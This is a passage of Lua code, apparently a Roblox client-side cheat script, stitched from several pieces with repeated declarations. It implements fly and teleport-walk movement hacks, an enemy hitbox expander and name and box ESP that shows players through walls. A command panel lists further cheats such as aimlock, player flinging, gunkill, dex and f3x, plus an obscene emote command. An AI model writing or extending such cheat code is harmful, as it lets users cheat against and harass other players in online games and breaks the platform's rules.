        -- Rotate button arrow
        local buttonTween = tweenService:Create(
            minimizeButton,
            TweenInfo.new(0.3),
            {Rotation = 180}
        )
        buttonTween:Play()
    else
        -- Animate to expanded state
        local frameTween = tweenService:Create(
            mainFrame,
            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(0.4, 0, 0.4, 0)}
        )
        frameTween:Play()
        
        -- Fade out collapsed label
        local labelTween = tweenService:Create(
            collapsedLabel,
            TweenInfo.new(0.2),
            {TextTransparency = 1}
        )
        labelTween:Play()
        
        -- After label fades out, show other elements
        labelTween.Completed:Connect(function()
            collapsedLabel.Visible = false
            outputFrame.Visible = true
            inputBox.Visible = true
            inputBoxFrame.Visible = true
        end)
        
        -- Rotate button arrow back
        local buttonTween = tweenService:Create(
            minimizeButton,
            TweenInfo.new(0.3),
            {Rotation = 0}
        )
        buttonTween:Play()
    end
end)

print("MinimizeButton and CollapsedLabel created and parented by hm5650")

    -- Table to store original transparency values
    local originalTransparency = {}

    local player = game.Players.LocalPlayer  
    local character = player.Character or player.CharacterAdded:Wait()  

    function SitPlayer()  
         if character and character:FindFirstChild("Humanoid") then  
            character.Humanoid.Sit = true  
         end  
    end  

    local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local speeds = 1 -- Default speed for both flying and TP walk
local nowe = false
local tpwalking = false

-- TP Walk Functionality
local function TpWalk()
    tpwalking = true

    while tpwalking and humanoid.Health > 0 do
        game:GetService("RunService").Heartbeat:Wait()

        if humanoid.MoveDirection.Magnitude > 0 then
            -- Calculate movement direction and apply speed
            local moveDirection = humanoid.MoveDirection.Unit
            local velocity = moveDirection * speeds * 50 -- Adjust speed multiplier here
            rootPart.CFrame = rootPart.CFrame + velocity * game:GetService("RunService").Heartbeat:Wait()
        end
    end
end

local function StartTpWalk()
    if not tpwalking then
        tpwalking = true
        spawn(TpWalk)
    end
end

local function StopTpWalk()
    tpwalking = false
end

local function SetTpWalkSpeed(newSpeed)
    speeds = newSpeed
    print("TP Walk speed set to:", speeds)
end

-- Fly Functionality
local function Fly()
    nowe = true

    -- Disable animations and humanoid states
    character.Animate.Disabled = true
    for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
        track:AdjustSpeed(0)
    end

    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, false)
    humanoid:ChangeState(Enum.HumanoidStateType.Swimming)

    -- Create BodyGyro and BodyVelocity for flying
    local flyGyro = Instance.new("BodyGyro")
    flyGyro.P = 9e4
    flyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
    flyGyro.cframe = rootPart.CFrame
    flyGyro.Parent = rootPart

    local flyVelocity = Instance.new("BodyVelocity")
    flyVelocity.velocity = Vector3.new(0, 0.1, 0)
    flyVelocity.maxForce = Vector3.new(9e9, 9e9, 9e9)
    flyVelocity.Parent = rootPart

    humanoid.PlatformStand = true

    -- Movement logic
    local controlCooldown = 0
    local lastLookVector = Vector3.new(0, 0, 0)

    while nowe and humanoid.Health > 0 do
        game:GetService("RunService").RenderStepped:Wait()

        -- Get camera look vector
        local camera = workspace.CurrentCamera
        local lookVector = camera.CFrame.LookVector
        lastLookVector = lookVector

        -- Get player input
        local moveDirection = Vector3.new(0, 0, 0)
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
            moveDirection = moveDirection + lookVector
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
            moveDirection = moveDirection - lookVector
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
            moveDirection = moveDirection - camera.CFrame.RightVector
        end
        if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
            moveDirection = moveDirection + camera.CFrame.RightVector
        end

        -- Normalize move direction
        if moveDirection.Magnitude > 0 then
            moveDirection = moveDirection.Unit
        end

        -- Apply movement
        flyVelocity.velocity = moveDirection * speeds * 50

        -- Update BodyGyro to match camera rotation
        flyGyro.cframe = CFrame.new(rootPart.Position, rootPart.Position + lookVector)
    end

    -- Clean up
    flyGyro:Destroy()
    flyVelocity:Destroy()
    humanoid.PlatformStand = false
end

local function UnFly()
    nowe = false
    tpwalking = false

    -- Re-enable humanoid states
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, true)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, true)
    humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)

    -- Re-enable animations
    character.Animate.Disabled = false
    humanoid.PlatformStand = false
end

-- hitbox Variable
local hitboxEnabled = false
local hitboxSize = 20
local hitboxTransparency = 0.89
local hitboxLoop

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

-- Store original properties for restoration
local originalProperties = {
    HumanoidRootPart = {},
    Head = {}
}

local function playerIsValidTarget(player)
    return (player ~= localPlayer) and ((player.Team ~= localPlayer.Team) or (player.Team == nil))
end

local function storeOriginalProperties(character)
    if not character then return end
    
    local root = character:FindFirstChild("HumanoidRootPart")
    if root and not originalProperties.HumanoidRootPart[character] then
        originalProperties.HumanoidRootPart[character] = {
            Size = root.Size,
            Transparency = root.Transparency,
            BrickColor = root.BrickColor,
            Material = root.Material,
            CanCollide = root.CanCollide,
            Massless = if root:IsA("BasePart") then root.Massless else nil
        }
    end
    
    local head = character:FindFirstChild("Head")
    if head and not originalProperties.Head[character] then
        originalProperties.Head[character] = {
            Size = head.Size,
            Transparency = head.Transparency,
            BrickColor = head.BrickColor,
            Material = head.Material,
            CanCollide = head.CanCollide,
            Massless = if head:IsA("BasePart") then head.Massless else nil
        }
    end
end

local function applyHitbox(character)
    if not character then return end
    storeOriginalProperties(character)
    
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        root.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
        root.Transparency = hitboxTransparency
        root.BrickColor = BrickColor.new("Dark red")
        root.Material = Enum.Material.Neon
        root.CanCollide = false
        if root:IsA("BasePart") then
            root.Massless = true
        end
    end
    
    local head = character:FindFirstChild("Head")
    if head then
        head.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
        head.Transparency = hitboxTransparency
        head.BrickColor = BrickColor.new("Bright red")
        head.Material = Enum.Material.Neon
        head.CanCollide = false
        if head:IsA("BasePart") then
            head.Massless = true
        end
    end
end

local function resetHitbox(character)
    if not character then return end
    
    local root = character:FindFirstChild("HumanoidRootPart")
    if root and originalProperties.HumanoidRootPart[character] then
        local props = originalProperties.HumanoidRootPart[character]
        root.Size = props.Size
        root.Transparency = props.Transparency
        root.BrickColor = props.BrickColor
        root.Material = props.Material
        root.CanCollide = props.CanCollide
        if root:IsA("BasePart") then
            root.Massless = props.Massless
        end
        originalProperties.HumanoidRootPart[character] = nil
    end
    
    local head = character:FindFirstChild("Head")
    if head and originalProperties.Head[character] then
        local props = originalProperties.Head[character]
        head.Size = props.Size
        head.Transparency = props.Transparency
        head.BrickColor = props.BrickColor
        head.Material = props.Material
        head.CanCollide = props.CanCollide
        if head:IsA("BasePart") then
            head.Massless = props.Massless
        end
        originalProperties.Head[character] = nil
    end
end

local function updateAllHitboxes()
    for _, player in ipairs(Players:GetPlayers()) do
        if playerIsValidTarget(player) and player.Character then
            applyHitbox(player.Character)
        end
    end
end

local function resetAllHitboxes()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            resetHitbox(player.Character)
        end
    end
end

function hitboxeson()
    if hitboxEnabled then return end
    hitboxEnabled = true
    
    -- Store original properties first
    for _, player in ipairs(Players:GetPlayers()) do
        if playerIsValidTarget(player) and player.Character then
            storeOriginalProperties(player.Character)
        end
    end
    
    updateAllHitboxes()
    
    if not hitboxLoop then
        hitboxLoop = game:GetService("RunService").Heartbeat:Connect(function()
            if not hitboxEnabled then return end
            updateAllHitboxes()
        end)
    end
end

function hitboxesoff()
    if not hitboxEnabled then return end
    hitboxEnabled = false
    
    if hitboxLoop then
        hitboxLoop:Disconnect()
        hitboxLoop = nil
    end
    
    resetAllHitboxes()
end

-- Player connection handling
local function handlePlayer(player)
    if player == localPlayer then return end
    
    player.CharacterAdded:Connect(function(character)
        task.wait(1) -- Wait for character to fully load
        if hitboxEnabled and playerIsValidTarget(player) then
            storeOriginalProperties(character)
            applyHitbox(character)
        end
    end)
    
    if player.Character and hitboxEnabled and playerIsValidTarget(player) then
        storeOriginalProperties(player.Character)
        applyHitbox(player.Character)
    end
    
    player.CharacterRemoving:Connect(function(character)
        -- Clean up stored properties when player leaves
        originalProperties.HumanoidRootPart[character] = nil
        originalProperties.Head[character] = nil
    end)
end

-- Initialize for existing players
for _, player in ipairs(Players:GetPlayers()) do
    handlePlayer(player)
end

-- Set up for new players
Players.PlayerAdded:Connect(handlePlayer)

-- Clean up when player leaves
Players.PlayerRemoving:Connect(function(player)
    if player.Character then
        originalProperties.HumanoidRootPart[player.Character] = nil
        originalProperties.Head[player.Character] = nil
    end
end)

-- Cmdspanel
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CommandPanel"
screenGui.ResetOnSpawn = false
screenGui.Enabled = false  -- Start hidden
screenGui.Parent = PlayerGui

-- Create Main Frame
local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = UDim2.new(0.3, 0, 0.4, 0)
frame.Position = UDim2.new(0.35, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

-- Rounded Corners
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

-- Subtle Border
local border = Instance.new("UIStroke")
border.Color = Color3.fromRGB(80, 80, 90)
border.Thickness = 1
border.Transparency = 0.5
border.Parent = frame

-- Pulsing Outline Effect
local pulseOutline = Instance.new("UIStroke")
pulseOutline.Color = Color3.fromRGB(150, 150, 150)
pulseOutline.Thickness = 2
pulseOutline.Transparency = 1
pulseOutline.Parent = frame

-- Animation for pulsing effect
local pulseAnimation
local function startPulsing()
    if pulseAnimation then pulseAnimation:Disconnect() end
    
    pulseAnimation = game:GetService("RunService").Heartbeat:Connect(function()
        local time = os.clock()
        local pulse = math.sin(time * 5) * 0.5 + 0.5  -- Creates a 0-1 oscillation
        pulseOutline.Transparency = 1 - (pulse * 0.5)  -- Range 0.5-1 transparency
        pulseOutline.Thickness = 2 + pulse  -- Range 2-3 thickness
    end)
end

-- EASIER DRAGGING IMPLEMENTATION
local dragStartPos
local frameStartPos
local isDragging = false

-- Make the entire header draggable
local header = Instance.new("Frame")
header.Name = "Header"
header.Size = UDim2.new(1, 0, 0.12, 0)
header.Position = UDim2.new(0, 0, 0, 0)
header.BackgroundTransparency = 1  -- Invisible but clickable
header.ZIndex = 10  -- Ensure it's above other elements
header.Parent = frame

-- Start dragging when clicking header
header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStartPos = input.Position
        frameStartPos = frame.Position
        
        -- Visual feedback
        TweenService:Create(frame, TweenInfo.new(0.1), {
            BackgroundTransparency = 0.05
        }):Play()
        
        TweenService:Create(pulseOutline, TweenInfo.new(0.1), {
            Color = Color3.fromRGB(200, 200, 200),
            Thickness = 3
        }):Play()

        -- Set up drag end connection
        local dragEndConnection
        dragEndConnection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                isDragging = false
                dragEndConnection:Disconnect()
                
                -- Return to normal appearance
                TweenService:Create(frame, TweenInfo.new(0.1), {
                    BackgroundTransparency = 0.1
                }):Play()
                
                TweenService:Create(pulseOutline, TweenInfo.new(0.3), {
                    Color = Color3.fromRGB(150, 150, 150)
                }):Play()
            end
        end)
    end
end)

-- Update position while dragging
UserInputService.InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local mousePos = input.Position
        local delta = mousePos - dragStartPos
        frame.Position = UDim2.new(
            frameStartPos.X.Scale,
            frameStartPos.X.Offset + delta.X,
            frameStartPos.Y.Scale,
            frameStartPos.Y.Offset + delta.Y
        )
    end
end)

-- Header visuals
local headerBackground = Instance.new("Frame")
headerBackground.Size = UDim2.new(1, 0, 1, 0)
headerBackground.Position = UDim2.new(0, 0, 0, 0)
headerBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
headerBackground.BackgroundTransparency = 0.2
headerBackground.BorderSizePixel = 0
headerBackground.ZIndex = 1
headerBackground.Parent = header

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 8)
headerCorner.Parent = headerBackground

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 0.8, 0)
title.Position = UDim2.new(0.1, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.Text = "COMMAND LIST"
title.TextColor3 = Color3.fromRGB(220, 220, 220)
title.TextScaled = true
title.Font = Enum.Font.GothamSemibold
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 2
title.Parent = header

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0.1, 0, 0.7, 0)
closeButton.Position = UDim2.new(0.88, 0, 0.15, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
closeButton.BackgroundTransparency = 0.7
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(220, 220, 220)
closeButton.TextSize = 24
closeButton.Font = Enum.Font.GothamBold
closeButton.ZIndex = 2
closeButton.Parent = header

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0.5, 0)
closeCorner.Parent = closeButton

-- Close Button Effects
closeButton.MouseEnter:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.2), {
        BackgroundTransparency = 0.5,
        BackgroundColor3 = Color3.fromRGB(80, 80, 85),
        TextColor3 = Color3.fromRGB(240, 240, 240)
    }):Play()
end)

closeButton.MouseLeave:Connect(function()
    TweenService:Create(closeButton, TweenInfo.new(0.2), {
        BackgroundTransparency = 0.7,
        BackgroundColor3 = Color3.fromRGB(60, 60, 65),
        TextColor3 = Color3.fromRGB(220, 220, 220)
    }):Play()
end)

closeButton.MouseButton1Click:Connect(function()
    ShowCmds()  -- Toggle visibility
end)

-- Command List
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(0.95, 0, 0.85, 0)
scrollingFrame.Position = UDim2.new(0.025, 0, 0.13, 0)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.ScrollBarThickness = 4
scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 110)
scrollingFrame.Parent = frame

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Padding = UDim.new(0, 6)
uiListLayout.Parent = scrollingFrame

local uiPadding = Instance.new("UIPadding")
uiPadding.PaddingLeft = UDim.new(0, 5)
uiPadding.PaddingRight = UDim.new(0, 5)
uiPadding.PaddingTop = UDim.new(0, 5)
uiPadding.Parent = scrollingFrame

-- Sample Commands
local commands = {
    "cmds",
    "clear",
    "emitteron/en",
    "emitteroff/ef",
    "reset/re",
    "serverhop/shop",
    "fov <mum>",
    "walkspeed/ws <num>",
    "resetwalkspeed/resetws",
    "jumppower/jp <num>",
    "tpto <plr>",
    "grav <num>",
    "infjump - fly by jumping",
    "bringunachored/bring ua",
    "hitbox",
    "unhitbox",
    "aimlock",
    "esp",
    "boxesp/besp",
    "disableboxesp/dbesp",
    "nameesp/nesp",
    "disablenameesp/dnesp",
    "unesp",
    "unctest",
    "loadpcr",
    "loadhitblox",
    "xray",
    "unxray",
    "dex",
    "inf",
    "namelessadmin/na",
    "namelessadminv2/nav2",
    "sit",
    "lay",
    "fly/f",
    "unfly/uf",
    "tpwalk/tpw",
    "tpwalkspeed/tpws",
    "stoptpwalk/stpw",
    "enabletfling/etf",
    "disabletfling/dtf",
    "fling <plr>",
    "flingall",
    "loopfling/lfling",
    "noclip",
    "clip",
    "gunkill/gk",
    "stopgunkill/gk",
    "ringplayers/rp",
    "stopringplayers/srp",
    "meleekill/mk",
    "stopmeleekill/smk",
    "massiveheads/mh",
    "nomassiveheads/nmh",
    "voidprotection/vp",
    "disablevoidprotection/dvp",
    "blackhole/bh",
    "disableblackhole/dbh",
    "telekinesis/tk",
    "jerkoff [R6]",
    "f3x/fex",
    "winobby",
    "floatparts",
}

-- Add commands to the list
for i, cmd in ipairs(commands) do
    local commandFrame = Instance.new("Frame")
    commandFrame.Size = UDim2.new(1, 0, 0, 32)
    commandFrame.BackgroundTransparency = 0.9
    commandFrame.BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(45, 45, 50) or Color3.fromRGB(35, 35, 40)
    commandFrame.Parent = scrollingFrame
    
    local commandCorner = Instance.new("UICorner")
    commandCorner.CornerRadius = UDim.new(0, 4)
    commandCorner.Parent = commandFrame
    
    local commandLabel = Instance.new("TextLabel")
    commandLabel.Size = UDim2.new(1, -10, 1, 0)
    commandLabel.Position = UDim2.new(0, 10, 0, 0)
    commandLabel.BackgroundTransparency = 1
    commandLabel.Text = cmd
    commandLabel.TextColor3 = Color3.fromRGB(200, 200, 210)
    commandLabel.TextScaled = true
    commandLabel.TextXAlignment = Enum.TextXAlignment.Left
    commandLabel.Font = Enum.Font.Gotham
    commandLabel.Parent = commandFrame
    
    -- Hover effects
    commandFrame.MouseEnter:Connect(function()
        TweenService:Create(commandFrame, TweenInfo.new(0.2), {
            BackgroundTransparency = 0.85,
            BackgroundColor3 = Color3.fromRGB(55, 55, 60)
        }):Play()
    end)
    
    commandFrame.MouseLeave:Connect(function()
        TweenService:Create(commandFrame, TweenInfo.new(0.2), {
            BackgroundTransparency = 0.9,
            BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(45, 45, 50) or Color3.fromRGB(35, 35, 40)
        }):Play()
    end)
end

-- Update scrolling frame size
uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y + 10)
end)

-- Toggle function
function ShowCmds()
    screenGui.Enabled = not screenGui.Enabled
    
    if screenGui.Enabled then
        -- Start animations when shown
        startPulsing()
        
        -- Animate in
        frame.Size = UDim2.new(0, 0, 0.4, 0)
        frame.Position = UDim2.new(0.5, 0, 0.3, 0)
        frame.BackgroundTransparency = 1
        
        TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0.3, 0, 0.4, 0),
            Position = UDim2.new(0.35, 0, 0.3, 0),
            BackgroundTransparency = 0.1
        }):Play()
    else
        -- Stop animations when hidden
        if pulseAnimation then
            pulseAnimation:Disconnect()
            pulseAnimation = nil
        end
        
        -- Animate out
        TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 0, 0.4, 0),
            Position = UDim2.new(0.5, 0, 0.3, 0),
            BackgroundTransparency = 1
        }):Play()
    end
end

-- Combined ESP Script
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- NameESP Configuration
local NameESPConfig = {
    Enabled = false,
    TeamCheck = true,
    MaxDistance = 1000,
    Color = Color3.new(1, 1, 1),
    TeamColor = Color3.new(0, 1, 0),
    EnemyColor = Color3.new(1, 0, 0)
}

-- BoxESP Configuration
local BoxESPConfig = {
    Enabled = false,
    TeamCheck = true
}

-- Variables
local namePlayerAddedConnection
local nameRenderSteppedConnection
local nameCharacterConnections = {} -- Track character connections for cleanup
local boxEspBoxes = {}

-- NameESP Functions
local function CreateEspLabel(character)
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
    if not humanoidRootPart then return end
    
    -- Remove existing label if it exists
    local existingLabel = humanoidRootPart:FindFirstChild("EspLabel")
    if existingLabel then
        existingLabel:Destroy()
    end
    
    local espLabel = Instance.new("BillboardGui")
    espLabel.Name = "EspLabel"
    espLabel.Parent = humanoidRootPart
    espLabel.Adornee = humanoidRootPart
    espLabel.AlwaysOnTop = true
    espLabel.LightInfluence = 0
    espLabel.Size = UDim2.new(0, 200, 0, 20)
    espLabel.StudsOffset = Vector3.new(0, 2, 0)
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "TextLabel"
    textLabel.Parent = espLabel
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = character.Name
    textLabel.Font = Enum.Font.SourceSansSemibold
    textLabel.TextSize = 18
    textLabel.TextColor3 = NameESPConfig.Color
    textLabel.TextStrokeTransparency = 0.5
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    
    return espLabel
end

local function UpdateEspLabel(character)
    local espLabel = character:FindFirstChild("EspLabel")
    if espLabel then
        local textLabel = espLabel:FindFirstChild("TextLabel")
        if textLabel then
            local player = Players:GetPlayerFromCharacter(character)
            if player then
                local localPlayer = Players.LocalPlayer
                local localCharacter = localPlayer.Character
                
                -- Distance check
                if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart") then
                    local distance = (character.HumanoidRootPart.Position - localCharacter.HumanoidRootPart.Position).Magnitude
                    if distance > NameESPConfig.MaxDistance then
                        espLabel.Enabled = false
                        return
                    else
                        espLabel.Enabled = true
                    end
                end
                
                textLabel.Text = player.Name
                if NameESPConfig.TeamCheck then
                    if player.Team == localPlayer.Team then
                        textLabel.TextColor3 = NameESPConfig.TeamColor
                    else
                        textLabel.TextColor3 = NameESPConfig.EnemyColor
                    end
                else
                    textLabel.TextColor3 = NameESPConfig.Color
                end
            end
        end
    end
end

-- BoxESP Functions
local function createBox(player)
    local box = Instance.new("BoxHandleAdornment")
    box.Name = player.Name .. "_ESP"
    box.Adornee = nil -- Will be set when character exists
    box.AlwaysOnTop = true
    box.ZIndex = 10
    box.Size = Vector3.new(4, 6, 1)
    box.Transparency = 0.8
    box.Color3 = Color3.new(1, 1, 1)
    
    local outline = Instance.new("SelectionBox")
    outline.Name = player.Name .. "_Outline"
    outline.Adornee = nil
    outline.LineThickness = 0.05
    outline.Color3 = Color3.new(1, 1, 1)
    outline.Transparency = 0.3
    
    return box, outline
end

local function updateBoxColor(player, box, outline)
    if not player or not box or not outline then return end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end
    
    if player.Team and localPlayer.Team then
        if player.Team ~= localPlayer.Team then
            box.Color3 = Color3.new(1, 0, 0)
            outline.Color3 = Color3.new(1, 0.3, 0.3)
        else
            box.Adornee = nil
            outline.Adornee = nil
            return
        end
    else
        box.Color3 = Color3.new(1, 1, 1)
        outline.Color3 = Color3.new(1, 1, 1)
    end
    
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        box.Adornee = player.Character.HumanoidRootPart
        outline.Adornee = player.Character.HumanoidRootPart
    end
end

-- Main Functions
function NameEspOn()
    if NameESPConfig.Enabled then return end
    NameESPConfig.Enabled = true
    
    -- Clear existing character connections
    for _, connection in pairs(nameCharacterConnections) do
        connection:Disconnect()
    end
    nameCharacterConnections = {}
    
    -- Create ESP for existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            if player.Character then
                CreateEspLabel(player.Character)
            end
            nameCharacterConnections[player] = player.CharacterAdded:Connect(function(character)
                CreateEspLabel(character)
            end)
        end
    end
    
    -- Connect to new players
    namePlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
        if player ~= Players.LocalPlayer then
            nameCharacterConnections[player] = player.CharacterAdded:Connect(function(character)
                CreateEspLabel(character)
            end)
        end
    end)
    
    -- Update loop
    nameRenderSteppedConnection = RunService.RenderStepped:Connect(function()
        if NameESPConfig.Enabled then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and player.Character then
                    UpdateEspLabel(player.Character)
                end
            end
        end
    end)
end

function NameEspOff()
    if not NameESPConfig.Enabled then return end
    NameESPConfig.Enabled = false
    
    -- Disconnect all connections
    if namePlayerAddedConnection then
        namePlayerAddedConnection:Disconnect()
        namePlayerAddedConnection = nil
    end
    
    if nameRenderSteppedConnection then
        nameRenderSteppedConnection:Disconnect()
        nameRenderSteppedConnection = nil
    end
    
    for player, connection in pairs(nameCharacterConnections) do
        connection:Disconnect()
    end
    nameCharacterConnections = {}
    
    -- Remove all ESP labels
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            local espLabel = player.Character:FindFirstChild("EspLabel")
            if espLabel then
                espLabel:Destroy()
            end
        end
        
        -- Also check for any labels in workspace (in case they weren't parented to character)
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant.Name == "EspLabel" and descendant:IsA("BillboardGui") then
                descendant:Destroy()
            end
        end
    end
end

function BoxEspOn()
    if BoxESPConfig.Enabled then return end
    BoxESPConfig.Enabled = true
    
    -- Clear existing boxes
    for player, data in pairs(boxEspBoxes) do
        data.box:Destroy()
        data.outline:Destroy()
    end
    boxEspBoxes = {}
    
    -- Create boxes for all current players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            local box, outline = createBox(player)
            box.Parent = player.Character and player.Character:FindFirstChild("HumanoidRootPart") or workspace
            outline.Parent = player.Character and player.Character:FindFirstChild("HumanoidRootPart") or workspace
            boxEspBoxes[player] = {box = box, outline = outline}
            
            if player.Character then
                updateBoxColor(player, box, outline)
            end
            
            player.CharacterAdded:Connect(function(character)
                if BoxESPConfig.Enabled then
                    local rootPart = character:WaitForChild("HumanoidRootPart")
                    if rootPart then
                        box.Adornee = rootPart
                        box.Parent = rootPart
                        outline.Adornee = rootPart
                        outline.Parent = rootPart
                        updateBoxColor(player, box, outline)
                    end
                end
            end)
            
            player:GetPropertyChangedSignal("Team"):Connect(function()
                if BoxESPConfig.Enabled then
                    updateBoxColor(player, box, outline)
                end
            end)
        end
    end
    
    -- Connect to new players
    Players.PlayerAdded:Connect(function(player)
        if player ~= Players.LocalPlayer then
            local box, outline = createBox(player)
            box.Parent = workspace
            outline.Parent = workspace
            boxEspBoxes[player] = {box = box, outline = outline}
            
            player.CharacterAdded:Connect(function(character)
                if BoxESPConfig.Enabled then
                    local rootPart = character:WaitForChild("HumanoidRootPart")
                    if rootPart then
                        box.Adornee = rootPart
                        box.Parent = rootPart
                        outline.Adornee = rootPart
                        outline.Parent = rootPart
                        updateBoxColor(player, box, outline)
                    end
                end
            end)
        end
    end)
end

function BoxEspOff()
    if not BoxESPConfig.Enabled then return end
    BoxESPConfig.Enabled = false
    
    for player, data in pairs(boxEspBoxes) do
        data.box:Destroy()
        data.outline:Destroy()
    end
    boxEspBoxes = {}
end

function EspOff()
    NameEspOff()
    BoxEspOff()
end

-- Handle player respawn
Players.LocalPlayer.CharacterAdded:Connect(function(character)
    if NameESPConfig.Enabled then
        CreateEspLabel(character)
    end
end)

-- Table to store ESP objects
local espObjects = {}
local espConnections = {}

-- Function to create ESP for a player
local function createEsp(player)
    -- Ensure the player has a character and head
    if not player.Character or not player.Character:FindFirstChild("Head") then return end

    -- Create BillboardGui
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Name = "ESP"
    billboardGui.Adornee = player.Character.Head
    billboardGui.Size = UDim2.new(1, 0, 1, 0)
    billboardGui.StudsOffset = Vector3.new(0, 2, 0)
    billboardGui.AlwaysOnTop = true

